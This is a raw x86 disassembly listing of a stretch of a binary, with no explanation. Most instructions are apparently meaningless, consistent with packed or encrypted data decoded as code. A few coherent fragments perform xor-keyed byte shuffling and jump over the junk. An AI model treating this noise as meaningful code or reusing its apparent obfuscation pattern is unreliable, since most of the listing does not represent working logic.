  40c8ce:	test   ax,0xb1c7
  40c8d2:	repz pop es
  40c8d4:	mov    al,0x8f
  40c8d6:	jae    0x40c873
  40c8d8:	jmp    0x842292c4
  40c8dd:	dec    ecx
  40c8de:	and    dh,ah
  40c8e0:	test   edx,eax
  40c8e2:	push   cs
  40c8e3:	push   es
  40c8e4:	mov    esp,0x9caf661a
  40c8e9:	(bad)  
  40c8eb:	mov    dh,0x67
  40c8ed:	adc    eax,0xd617a7fe
  40c8f2:	sbb    eax,0x1f5552dd
  40c8f7:	lahf   
  40c8f8:	pop    edi
  40c8f9:	fs xchg edi,eax
  40c8fb:	pop    ebx
  40c8fc:	dec    edi
  40c8fd:	je     0x40c905
  40c8ff:	jmp    0x1d92fbb7
  40c904:	imul   ebp,DWORD PTR [ebx-0x2c],0x13
  40c908:	or     ebx,DWORD PTR [edx+0x76]
  40c90b:	out    0x3e,eax
  40c90d:	push   esi
  40c90e:	call   0xb078:0x356cee5b
  40c915:	add    DWORD PTR [ebp+0x546e04ee],esi
  40c91b:	xchg   DWORD PTR [ecx],eax
  40c91d:	sbb    eax,DWORD PTR [esi+0x2953ad94]
  40c923:	fwait
  40c924:	pop    esi
  40c925:	(bad)  
  40c927:	mov    ds:0xe10cea8a,al
  40c92c:	pop    es
  40c92d:	xlat   BYTE PTR ds:[ebx]
  40c92e:	std    
  40c92f:	xchg   ecx,eax
  40c930:	fdivr  DWORD PTR [ebp+0xededdcb]
  40c936:	cld    
  40c937:	rcr    eax,1
  40c939:	xor    al,0xdb
  40c93b:	dec    esi
  40c93c:	and    ecx,0xffffffc8
  40c93f:	adc    al,0x5d
  40c941:	js     0x40c985
  40c943:	jnp    0x40c8d4
  40c945:	add    edx,DWORD PTR [ebp-0x14]
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	rdmsr  
  40c99f:	adc    BYTE PTR [eax-0x71],al
  40c9a2:	retf   0x7e92
  40c9a5:	jle    0x40ca17
  40c9a7:	jns    0x40ca27
  40c9a9:	jle    0x40ca27
  40c9ab:	inc    ebp
  40c9ac:	jg     0x40c979
  40c9ae:	scas   al,BYTE PTR es:[edi]
  40c9af:	fisttp WORD PTR [ecx]
  40c9b1:	mul    DWORD PTR [edi]
  40c9b3:	pushf  
  40c9b4:	cmp    DWORD PTR [eax-0x7033038b],eax
  40c9ba:	cwde   
  40c9bb:	popa   
  40c9bc:	mov    al,BYTE PTR [ebp+0x27]
  40c9bf:	test   BYTE PTR [edx-0x453ade4d],ah
  40c9c5:	push   ecx
  40c9c6:	cs mov ch,0xa4
  40c9c9:	and    dl,BYTE PTR [ebp-0x4fc734c0]
  40c9cf:	bnd jp 0x40ca35
  40c9d2:	pop    es
  40c9d3:	mov    bl,0xf0
  40c9d5:	test   dh,bl
  40c9d7:	test   eax,0x3f747409
  40c9dc:	(bad)  
  40c9dd:	test   al,0x66
  40c9df:	xchg   ebx,eax
  40c9e0:	test   eax,0x45b8ff93
  40c9e5:	ins    DWORD PTR es:[edi],dx
  40c9e6:	pop    ebp
  40c9e7:	loopne 0x40ca48
  40c9e9:	fcmovnu st,st(1)
  40c9eb:	xchg   ebx,eax
  40c9ec:	xor    cl,BYTE PTR [eax-0x1e]
  40c9ef:	(bad)  
  40c9f0:	ror    ah,0xf1
  40c9f3:	arpl   WORD PTR [edx],cx
  40c9f5:	arpl   di,di
  40c9f7:	js     0x40ca5d
  40c9f9:	aas    
  40c9fa:	ret    0x8e1e
  40c9fd:	mov    ebp,0xb4cd69c2
  40ca02:	xor    DWORD PTR [ecx],0x3048bc2a
  40ca08:	inc    ebp
  40ca09:	(bad)  
  40ca0a:	jmp    0x73e5dc6b
  40ca0f:	outs   dx,DWORD PTR ds:[esi]
  40ca10:	and    DWORD PTR [edx-0x11db1dca],edi
  40ca16:	xchg   edx,eax
  40ca17:	sahf   
  40ca18:	cmp    BYTE PTR [esi-0x65],ch
  40ca1b:	arpl   WORD PTR [edi+0x7678e345],sp
  40ca21:	out    0xfd,al
  40ca23:	add    bl,BYTE PTR [eax]
  40ca25:	pop    ecx
  40ca26:	jns    0x40ca1c
  40ca28:	je     0x40c9c4
  40ca2a:	fidivr WORD PTR [eax+0x186c8708]
  40ca30:	sbb    BYTE PTR [edi],dh
  40ca32:	and    DWORD PTR [eax-0x28122bbb],eax
  40ca38:	push   0x829776bc
  40ca3d:	ins    DWORD PTR es:[edi],dx
  40ca3e:	dec    ebp
  40ca3f:	popf   
  40ca40:	adc    ecx,DWORD PTR [ebp-0x48]
  40ca43:	inc    esi
  40ca44:	dec    ebx
  40ca45:	mov    DWORD PTR [edx],edx
  40ca47:	fst    st(6)
  40ca49:	cmp    esi,DWORD PTR [eax]
  40ca4b:	mov    ecx,0xe3b1774d
  40ca50:	ret    0x6ec
  40ca53:	mov    cl,0x4c
  40ca55:	adc    BYTE PTR [edi-0x22],0x9c
  40ca59:	mov    cl,0x5
  40ca5b:	sub    esp,DWORD PTR [ebx-0x2]
  40ca5e:	pop    edi
  40ca5f:	stc    
  40ca60:	cmp    edx,edi
  40ca62:	xchg   ebx,eax
  40ca63:	pusha  
  40ca64:	xor    eax,0x89052c3a
  40ca69:	(bad)  
  40ca6a:	mov    ebp,DWORD PTR [ebp+0x49]
  40ca6d:	cwde   
  40ca6e:	inc    eax
  40ca70:	retf   0x6e
  40ca73:	adc    ah,cl
  40ca75:	inc    ecx
  40ca76:	aam    0x54
  40ca78:	and    esp,DWORD PTR [esi-0x4b]
  40ca7b:	add    ecx,eax
  40ca7d:	aad    0x37
  40ca7f:	push   ebx
  40ca80:	sub    BYTE PTR [ecx],ah
  40ca82:	jge    0x40caa5
  40ca84:	jae    0x40ca40
  40ca86:	and    DWORD PTR [edi],0x9
  40ca89:	jne    0x40caf9
  40ca8b:	mov    al,ds:0x2af7d54f
  40ca90:	fwait
  40ca91:	mov    ds:0x584f8266,eax
  40ca96:	sbb    BYTE PTR [ebx+0x6d1fb876],bh
  40ca9c:	cmp    esi,eax
  40ca9e:	mov    ebp,0x582cf041
  40caa3:	xchg   edx,eax
  40caa4:	inc    esi
  40caa5:	add    BYTE PTR [ecx-0x1338e64c],dl
  40caab:	retf   0x89ab
  40caae:	mov    esi,0x35190868
  40cab3:	push   eax
  40cab4:	lahf   
  40cab5:	out    dx,eax
  40cab6:	mov    ecx,0x1c36e950
  40cabb:	mov    ebx,esi
  40cabd:	rcr    DWORD PTR [eax-0x36e80e2e],cl
  40cac3:	aam    0x13
  40cac5:	mov    ecx,0x4b6d5518
  40caca:	inc    esp
  40cacb:	push   cs
  40cacc:	xchg   edi,eax
  40cacd:	jge    0x40cb13
  40cacf:	add    esi,ecx
  40cad1:	retf   0xb68
  40cad4:	test   BYTE PTR [ecx-0x76c0f7e3],ah
  40cada:	or     eax,0xbc79e3e4
  40cadf:	adc    ebx,DWORD PTR [esi+0x5defe9c8]
  40cae5:	mov    edi,0x18f3494c
  40caea:	push   edx
  40caeb:	jne    0x40cb67
  40caed:	adc    ebp,edx
  40caef:	add    ch,BYTE PTR [ebx]
  40caf1:	ss jns 0x40cb1b
  40caf4:	cmp    DWORD PTR [ebx+0x7],edi
  40caf7:	pop    es
  40caf8:	mov    WORD PTR [eax],cs
  40cafa:	sbb    DWORD PTR [eax-0x6a],0x3c
  40cafe:	fisttp WORD PTR [ecx+eax*2]
  40cb01:	jle    0x40cac1
  40cb03:	retf   
  40cb04:	sbb    DWORD PTR [edi],edi
  40cb06:	mov    eax,0x5972f32b
  40cb0b:	pop    esp
  40cb0c:	push   cs
  40cb0d:	add    DWORD PTR [ecx],ecx
  40cb0f:	and    DWORD PTR [ebx-0x7e],0x1071975b
  40cb16:	cs es mov edx,0x4544be80
  40cb1d:	xchg   esp,eax
  40cb1e:	out    dx,al
  40cb1f:	(bad)  
  40cb20:	adc    DWORD PTR [ecx-0x951b707],edi
  40cb26:	jno    0x40cb95
  40cb28:	mov    ebx,0x5370e9c9
  40cb2d:	push   0x63e68246
  40cb32:	and    al,0xd9
  40cb34:	inc    BYTE PTR [eax+0x216457a5]
  40cb3a:	dec    edx
  40cb3b:	pop    eax
  40cb3c:	popa   
  40cb3d:	loope  0x40cadc
  40cb3f:	lock push ds
  40cb41:	mov    edx,0x5d58afa4
  40cb46:	mov    ebp,0xb356a85
  40cb4b:	nop
  40cb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4d:	cmp    eax,0xc83729eb
  40cb52:	adc    dh,BYTE PTR [esi]
  40cb54:	xchg   esp,eax
  40cb55:	xchg   edi,eax
  40cb56:	stc    
  40cb57:	inc    BYTE PTR [ebp+0x1b05b0ab]
  40cb5d:	pop    ebp
  40cb5e:	cmp    DWORD PTR [edx+0x19],ebx
  40cb61:	pushf  
  40cb62:	repz and DWORD PTR ds:0x9db19195,0xffffffe2
  40cb6b:	mov    bl,BYTE PTR [eax]
  40cb6d:	adc    eax,0x633b44a0
  40cb72:	pusha  
  40cb73:	push   ss
  40cb74:	xchg   ecx,eax
  40cb75:	fchs   
  40cb77:	test   DWORD PTR [edi-0x67],edx
  40cb7a:	jnp    0x40cb8a
  40cb7c:	jle    0x40cb86
  40cb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb7f:	frstor [esi-0x2d16bf1b]
  40cb85:	or     dl,al
  40cb87:	sub    ah,BYTE PTR [ebx]
  40cb89:	dec    eax
  40cb8a:	cmp    BYTE PTR [eax+0x54],ah
  40cb8d:	inc    ebp
  40cb8e:	dec    edi
  40cb8f:	test   al,0xb9
  40cb91:	fwait
  40cb92:	sub    al,0xf
  40cb94:	cdq    
  40cb95:	push   edx
  40cb96:	fstp   DWORD PTR ds:[ebp+ebp*2+0x59a327ff]
  40cb9e:	dec    edi
  40cb9f:	jnp    0x40cbda
  40cba1:	call   0xab9766ca
  40cba6:	iret   
  40cba7:	push   esi
  40cba8:	pop    ebp
  40cba9:	mov    al,ds:0x3449f3f7
  40cbae:	and    dl,BYTE PTR [ebx-0x3c67bfb]
  40cbb4:	pop    ebx
  40cbb5:	sub    al,BYTE PTR [ebx]
  40cbb7:	push   edx
  40cbb8:	aas    
  40cbb9:	jo     0x40cb9a
  40cbbb:	pop    ds
  40cbbc:	fsubrp st(0),st
  40cbbe:	xor    BYTE PTR [esp+eax*4-0x5decedad],dl
  40cbc5:	xor    BYTE PTR [eax+0x2a],bh
  40cbc8:	hlt    
  40cbc9:	das    
  40cbca:	inc    ebp
  40cbcb:	sbb    al,0x78
  40cbcd:	out    dx,eax
  40cbce:	pop    eax
  40cbcf:	(bad)  
  40cbd0:	or     DWORD PTR ds:[esi-0x7a],esi
  40cbd4:	stc    
  40cbd5:	test   al,0x1e
  40cbd7:	pop    edx
  40cbd8:	mov    esp,0x9084d967
  40cbdd:	jle    0x40cb82
  40cbdf:	mov    ds:0x731d3860,al
  40cbe4:	ret    0xa71f
  40cbe7:	mov    esi,0x98e47395
  40cbec:	inc    esp
  40cbed:	jb     0x40cc3d
  40cbef:	mov    ebp,DWORD PTR [bx+si-0xe]
  40cbf3:	sbb    al,BYTE PTR [ecx+0x7fa3ecf]
  40cbf9:	imul   ebx,ebp,0x78
  40cbfc:	test   al,0xe3
  40cbfe:	xchg   ecx,eax
  40cbff:	sbb    ebp,eax
  40cc01:	or     BYTE PTR [edi-0x33d4878],bh
  40cc07:	pop    eax
  40cc08:	ret    
  40cc09:	sbb    BYTE PTR [ebx+0x7],al
  40cc0c:	jno    0x40cc06
  40cc0e:	test   al,0x7c
  40cc10:	cmp    eax,0x693da6b2
  40cc15:	imul   eax,DWORD PTR [ecx+ebp*4+0x65],0xffffffa7
  40cc1a:	mov    ah,0x6d
  40cc1c:	repnz pop esp
  40cc1e:	sbb    ebx,DWORD PTR [ebp-0xf]
  40cc21:	mov    WORD PTR [ecx-0x2db3b78b],ss
  40cc27:	jae    0x40cc51
  40cc29:	cmp    al,0xa1
  40cc2b:	test   eax,0x4e6f6099
  40cc30:	or     al,0x7e
  40cc32:	jae    0x40cc37
  40cc34:	aaa    
  40cc35:	sahf   
  40cc36:	mov    ch,ah
  40cc38:	mov    bl,0x14
  40cc3a:	popf   
  40cc3b:	imul   esp,DWORD PTR [eax],0xc88e460c
  40cc41:	(bad)  
  40cc42:	or     BYTE PTR [eax-0x6c80aca0],dh
  40cc48:	imul   eax,ecx,0x33
  40cc4b:	add    eax,0xc8d9b6c9
  40cc50:	in     eax,0x71
  40cc52:	cld    
  40cc53:	and    DWORD PTR [eax-0x58],edx
  40cc56:	mov    ch,0x44
  40cc58:	or     ebp,ebp
  40cc5a:	cwde   
  40cc5b:	sbb    eax,0x6d9d3c25
  40cc60:	dec    eax
  40cc61:	nop
  40cc62:	addr16 in eax,dx
  40cc64:	jnp    0x40cc04
  40cc66:	ret    0xdd30
  40cc69:	sub    ebp,ebp
  40cc6b:	mul    DWORD PTR [edi+0x22]
  40cc6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc6f:	call   FWORD PTR [edx-0x54f57407]
  40cc75:	xor    bh,BYTE PTR [ebp-0x6ec4a7f4]
  40cc7b:	cs add ch,cl
  40cc7e:	pop    edi
  40cc7f:	sbb    eax,0x3776df64
  40cc84:	shl    dl,0x51
  40cc87:	push   cs
  40cc88:	inc    edi
  40cc89:	dec    edx
  40cc8a:	mov    ah,0x93
  40cc8c:	cmp    eax,0x3c032501
  40cc91:	push   ebx
  40cc92:	push   ebp
  40cc93:	(bad)  
  40cc94:	xchg   ebx,eax
  40cc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc96:	cmp    dl,BYTE PTR [ecx]
  40cc98:	pop    ebx
  40cc99:	enter  0x185f,0x28
  40cc9d:	xor    BYTE PTR [edx+esi*4+0x4f],cl
  40cca1:	ret    
  40cca2:	pop    esi
  40cca3:	inc    esi
  40cca4:	dec    ebx
  40cca5:	test   edi,edx
  40cca7:	xchg   ecx,eax
  40cca8:	in     al,0xad
  40ccaa:	lock retf 
  40ccac:	pop    es
  40ccad:	push   eax
  40ccae:	mov    ebp,0x6772d4d1
  40ccb3:	clc    
  40ccb4:	pop    ss
  40ccb5:	mov    esp,0x6128c97a
  40ccba:	les    ecx,FWORD PTR [eax+0x77]
  40ccbd:	scas   al,BYTE PTR es:[edi]
  40ccbe:	adc    edi,DWORD PTR [ebx]
  40ccc0:	sbb    BYTE PTR [ebx-0x55],cl
  40ccc3:	enter  0xab,0x44
  40ccc7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccc9:	mov    edi,0x77881fb2
  40ccce:	outs   dx,DWORD PTR ds:[esi]
  40cccf:	int3   
  40ccd0:	cmp    al,0x40
  40ccd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd3:	je     0x40cd30
  40ccd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccd6:	mov    esp,0xa9f913bf
  40ccdb:	test   al,0xd7
  40ccdd:	mov    esi,0x247e3b74
  40cce2:	aaa    
  40cce3:	loope  0x40cca1
  40cce5:	xor    eax,DWORD PTR [esi-0x1e4eae25]
  40cceb:	idiv   BYTE PTR [ebp-0xa339d4b]
  40ccf1:	je     0x40ccd9
  40ccf3:	popf   
  40ccf4:	xor    esi,ebx
  40ccf6:	repnz xor ebx,DWORD PTR [edx]
  40ccf9:	mov    dl,dh
  40ccfb:	push   es
  40ccfc:	add    eax,0x9fa7f38e
  40cd01:	retf   
  40cd02:	cmp    al,0xd6
  40cd04:	mov    bh,0x1f
  40cd06:	sbb    DWORD PTR [edx-0x269a8e65],ecx
  40cd0c:	push   eax
  40cd0d:	fs and edx,0x67
  40cd11:	mov    edx,0x250b29ad
  40cd16:	mov    DWORD PTR [bp+di],edx
  40cd19:	cdq    
  40cd1a:	mov    al,ds:0xfdd1ed83
  40cd1f:	dec    esp
  40cd20:	imul   esi,DWORD PTR [esi]
  40cd23:	cmp    ecx,DWORD PTR ds:0x7e0be26a
  40cd29:	mov    ch,0xc8
  40cd2b:	ror    DWORD PTR ds:0xc7df2da7,cl
  40cd31:	nop
  40cd32:	cs inc ebp
  40cd34:	push   ds
  40cd35:	lods   eax,DWORD PTR ds:[esi]
  40cd36:	sar    BYTE PTR [esi],1
  40cd38:	pop    es
  40cd39:	or     ch,BYTE PTR [ecx+0x6e]
  40cd3c:	mov    al,ds:0x912f87c3
  40cd41:	data16 clc 
  40cd43:	loopne 0x40cd47
  40cd45:	arpl   bx,di
  40cd47:	inc    ebx
  40cd48:	jle    0x40cd0e
  40cd4a:	mov    al,ds:0xbda2df5d
  40cd4f:	pusha  
  40cd50:	xlat   BYTE PTR ds:[ebx]
  40cd51:	cmp    al,0xb6
  40cd53:	add    edx,ebx
  40cd55:	data16 jp 0x40cdbf
  40cd58:	add    ebp,0xaeb26d6d
  40cd5e:	sbb    BYTE PTR [ebp-0x549507b1],cl
  40cd64:	or     bl,dh
  40cd66:	sub    BYTE PTR [edx],al
  40cd68:	mov    ecx,eax
  40cd6a:	fidiv  WORD PTR [esi-0x39c66111]
  40cd70:	fwait
  40cd71:	inc    ebp
  40cd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd73:	mov    al,ds:0x4f597e14
  40cd78:	pop    ecx
  40cd79:	push   0xffffff9a
  40cd7b:	ret    
  40cd7c:	add    DWORD PTR [eax],ebp
  40cd7e:	jbe    0x40cded
  40cd80:	pop    ecx
  40cd81:	add    esp,eax
  40cd83:	aad    0x59
  40cd85:	xor    al,0xf1
  40cd87:	out    0x16,eax
  40cd89:	dec    ebp
  40cd8a:	push   edx
  40cd8b:	push   eax
  40cd8c:	xchg   esp,eax
  40cd8d:	xchg   esi,eax
  40cd8e:	aas    
  40cd8f:	dec    eax
  40cd90:	in     eax,dx
  40cd91:	pop    ss
  40cd92:	not    DWORD PTR [ebx+ebx*2-0x72b993de]
  40cd99:	xchg   ecx,eax
  40cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9b:	push   esi
  40cd9c:	push   eax
  40cd9d:	add    DWORD PTR ds:0x6f3bdafc,esi
  40cda3:	ror    DWORD PTR [eax+0x72991f94],cl
  40cda9:	xor    al,BYTE PTR [eax]
  40cdab:	mov    edx,DWORD PTR [ebp-0x44]
  40cdae:	mov    edi,DWORD PTR [ebp-0xc]
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	call   0x7e9e:0xcced5516
  40cde0:	jle    0x40ce52
  40cde2:	jns    0x40ce62
  40cde4:	jle    0x40cded
  40cde6:	ins    BYTE PTR es:[edi],dx
  40cde7:	js     0x40cdfa
  40cde9:	je     0x40cdba
  40cdeb:	pop    ebx
  40cdec:	mov    ?,WORD PTR [edi+0x2babe079]
  40cdf2:	adc    ch,0x92
  40cdf5:	mov    dl,BYTE PTR [eax+0x35923ebe]
  40cdfb:	add    eax,0x2a19d64c
  40ce00:	pop    ss
  40ce01:	enter  0x417c,0xba
  40ce05:	repz sar BYTE PTR [edi+0x67],1
  40ce09:	ret    
  40ce0a:	fucom  st(2)
  40ce0c:	js     0x40ce1a
  40ce0e:	js     0x40ce2d
  40ce10:	xor    dh,BYTE PTR [eax]
  40ce12:	aaa    
  40ce13:	adc    DWORD PTR [eax+ecx*4],edx
  40ce16:	(bad)  
  40ce17:	loope  0x40ce82
  40ce19:	and    al,0x5
  40ce1b:	xchg   ecx,eax
  40ce1c:	leave  
  40ce1d:	cli    
  40ce1e:	or     eax,0xf4242c8
  40ce23:	out    0x57,eax
  40ce25:	pop    edx
  40ce26:	lods   al,BYTE PTR ds:[esi]
  40ce27:	(bad)  
  40ce28:	fsub   st,st(0)
  40ce2a:	fst    QWORD PTR [edi+0x908e6d2]
  40ce30:	data16 lods al,BYTE PTR ds:[esi]
  40ce32:	f2xm1  
  40ce34:	jg     0x40ce0d
  40ce36:	outs   dx,DWORD PTR ds:[esi]
  40ce37:	push   edi
  40ce38:	sub    eax,0x8fa2ca1e
  40ce3d:	xlat   BYTE PTR ds:[ebx]
  40ce3e:	pushf  
  40ce3f:	sbb    eax,0x407b6afc
  40ce44:	dec    ebp
  40ce45:	push   edx
  40ce46:	(bad)  
  40ce47:	mov    ds:0xf7f47ffd,eax
  40ce4c:	mov    al,0x99
  40ce4e:	mov    cx,0xab5
  40ce52:	jbe    0x40ce27
  40ce54:	pop    es
  40ce55:	adc    dh,BYTE PTR [esi+edx*4-0x7d]
  40ce59:	inc    ecx
  40ce5a:	jbe    0x40ce92
  40ce5c:	push   edx
  40ce5d:	loopne 0x40ce8a
  40ce5f:	sti    
  40ce60:	inc    ebp
  40ce61:	mov    dh,BYTE PTR [esi]
  40ce63:	in     eax,0x87
  40ce65:	(bad)  
  40ce66:	mov    ecx,0xfe1b4792
  40ce6b:	or     eax,0x5f3e1d94
  40ce70:	add    al,BYTE PTR [ecx+0x6c]
  40ce73:	div    ecx
  40ce75:	inc    eax
  40ce76:	fldcw  WORD PTR [edi+0x0]
  40ce79:	cmp    cl,BYTE PTR [eax]
  40ce7b:	stc    
  40ce7c:	inc    esp
  40ce7d:	dec    ecx
  40ce7e:	xlat   BYTE PTR ds:[ebx]
  40ce7f:	xor    ebp,DWORD PTR [eax+0x32f6b659]
  40ce85:	in     al,dx
  40ce86:	jno    0x40cecf
  40ce88:	mov    bh,0x8f
  40ce8a:	jns    0x40cea4
  40ce8c:	sbb    DWORD PTR [edx-0x3f],edx
  40ce8f:	js     0x40ceb9
  40ce91:	push   0xffffffac
  40ce93:	mov    ds:0x1bdaf72c,al
  40ce98:	(bad)  
  40ce99:	pop    ss
  40ce9a:	jb     0x40ce46
  40ce9c:	(bad)  
  40ce9d:	outs   dx,BYTE PTR ds:[esi]
  40ce9e:	jg     0x40ce7c
  40cea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea1:	enter  0x7343,0x7b
  40cea5:	mov    cl,cl
  40cea7:	scas   eax,DWORD PTR es:[edi]
  40cea8:	xchg   esp,eax
  40cea9:	aam    0x5b
  40ceab:	dec    edx
  40ceac:	xchg   ecx,eax
  40cead:	mov    al,0xb7
  40ceaf:	adc    eax,0xef8521be
  40ceb4:	(bad)  
  40ceb6:	push   0x87dc3dc5
  40cebb:	std    
  40cebc:	stos   BYTE PTR es:[edi],al
  40cebd:	call   0x70f:0x829cc8cc
  40cec4:	lods   al,BYTE PTR ds:[esi]
  40cec5:	mov    ebx,0x9a775e81
  40ceca:	and    al,0x53
  40cecc:	pop    ecx
  40cecd:	sub    bh,BYTE PTR [edi]
  40cecf:	pop    ebx
  40ced0:	rol    dh,cl
  40ced2:	int    0xcf
  40ced4:	sub    BYTE PTR [edi+0x71],bl
  40ced7:	sahf   
  40ced8:	dec    DWORD PTR [ecx+0x59cad14b]
  40cede:	mov    esp,0xf558972
  40cee3:	in     al,0xab
  40cee5:	je     0x40ce8c
  40cee7:	and    BYTE PTR [ecx+eax*8+0x4e],0xe9
  40ceec:	scas   eax,DWORD PTR es:[edi]
  40ceed:	jmp    0xca9542b6
  40cef2:	and    DWORD PTR [esi],edi
  40cef4:	les    ebp,FWORD PTR [eax-0x563e56ca]
  40cefa:	or     eax,DWORD PTR ds:0x1ead0a78
  40cf00:	add    bh,dh
  40cf02:	sbb    DWORD PTR [edx-0x5547b939],esp
  40cf08:	loop   0x40cf58
  40cf0a:	adc    eax,0x7428b2fe
  40cf0f:	lock sbb eax,0x17a9bf2f
  40cf15:	sub    al,0x60
  40cf17:	sahf   
  40cf18:	cmp    ebx,ebx
  40cf1a:	pop    ds
  40cf1b:	dec    ebp
  40cf1c:	jns    0x40cef2
  40cf1e:	fs and cl,bh
  40cf21:	(bad)  
  40cf22:	sti    
  40cf23:	add    eax,0x78943779
  40cf28:	leave  
  40cf29:	inc    ebx
  40cf2a:	mov    ss,eax
  40cf2c:	xor    BYTE PTR [eax-0x4b],cl
  40cf2f:	mov    dl,0x39
  40cf31:	sub    ebp,DWORD PTR [edi]
  40cf33:	and    BYTE PTR [eax+0x13ee163a],dh
  40cf39:	scas   al,BYTE PTR es:[edi]
  40cf3a:	call   0xa6cf:0xf5ceb464
  40cf41:	mov    edx,ds
  40cf43:	retf   0x57aa
  40cf46:	in     eax,0x9a
  40cf48:	shl    DWORD PTR [ecx+0x163996b4],0xa3
  40cf4f:	inc    eax
  40cf50:	push   edi
  40cf51:	pop    esp
  40cf52:	push   ss
  40cf53:	je     0x40cf93
  40cf55:	sti    
  40cf56:	es mov bl,0xb6
  40cf59:	data16 adc al,bl
  40cf5c:	push   0x8c29043f
  40cf61:	pop    eax
  40cf62:	jbe    0x40cf13
  40cf64:	xchg   ecx,eax
  40cf65:	ja     0x40cf5a
  40cf67:	(bad)  
  40cf68:	ds jge 0x40cf22
  40cf6b:	jb     0x40cfe1
  40cf6d:	xchg   ebp,eax
  40cf6e:	into   
  40cf6f:	and    DWORD PTR [eax],esi
  40cf71:	jmp    0x2a46a268
  40cf76:	inc    esp
  40cf77:	rcl    BYTE PTR ds:0xfc3557a3,cl
  40cf7d:	pusha  
  40cf7e:	inc    ebx
  40cf7f:	cld    
  40cf80:	(bad)  
  40cf81:	mov    bh,BYTE PTR [edx]
  40cf83:	loopne 0x40cf4f
  40cf85:	cmp    BYTE PTR [ebp-0x4a72777c],bh
  40cf8b:	fisubr DWORD PTR [ebx-0x1dd34e89]
  40cf91:	lahf   
  40cf92:	pop    ss
  40cf93:	loop   0x40cf6a
  40cf95:	jbe    0x40cf77
  40cf97:	xor    eax,0x7965c4c3
  40cf9c:	jg     0x40cfda
  40cf9e:	inc    edx
  40cf9f:	mov    esp,0xb0ff111c
  40cfa4:	push   0xffffff8a
  40cfa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa7:	retf   0x922b
  40cfaa:	pop    ebx
  40cfab:	inc    ecx
  40cfac:	out    dx,eax
  40cfad:	cmc    
  40cfae:	pop    ss
  40cfaf:	mov    bh,0x8a
  40cfb1:	mov    ch,0xa4
  40cfb3:	pop    es
  40cfb4:	push   ds
  40cfb5:	add    bh,ch
  40cfb7:	outs   dx,DWORD PTR ds:[esi]
  40cfb8:	mov    ecx,0x5a0a0fc7
  40cfbd:	inc    ecx
  40cfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfbf:	dec    ecx
  40cfc0:	retf   
  40cfc1:	sbb    al,0xee
  40cfc3:	nop
  40cfc4:	sahf   
  40cfc5:	or     edi,esi
  40cfc7:	popa   
  40cfc8:	push   0x3d87ddb1
  40cfcd:	pop    ebx
  40cfce:	in     eax,0x87
  40cfd0:	or     al,0x25
  40cfd2:	mov    esp,0xb359cc15
  40cfd7:	push   0x22
  40cfd9:	mov    ecx,ecx
  40cfdb:	addr16 out 0xac,al
  40cfde:	cmp    esp,DWORD PTR [esi]
  40cfe0:	inc    eax
  40cfe1:	ins    DWORD PTR es:[edi],dx
  40cfe2:	imul   DWORD PTR [ecx-0x41d3ef31]
  40cfe8:	mov    al,0x45
  40cfea:	sbb    bl,al
  40cfec:	(bad)  
  40cfee:	sub    ebp,ebp
  40cff0:	xchg   ebx,eax
  40cff1:	xor    ch,BYTE PTR ds:0x27cf000f
  40cff7:	daa    
  40cff8:	test   eax,0xd8c304d4
  40cffd:	adc    al,BYTE PTR [edx+edi*8+0x31c11500]
  40d004:	ror    DWORD PTR [eax-0x46],1
  40d007:	or     dl,bh
  40d009:	mov    esp,0x66e27b0c
  40d00e:	sub    al,0x28
  40d010:	shl    BYTE PTR [esi],0x18
  40d013:	mov    eax,ds:0xdf655a32
  40d018:	add    dl,ah
  40d01a:	test   al,0x96
  40d01c:	clc    
  40d01d:	loope  0x40cfcc
  40d01f:	xor    bh,BYTE PTR [edx-0x58535379]
  40d025:	shl    DWORD PTR [esi+0x11],1
  40d028:	jbe    0x40d09f
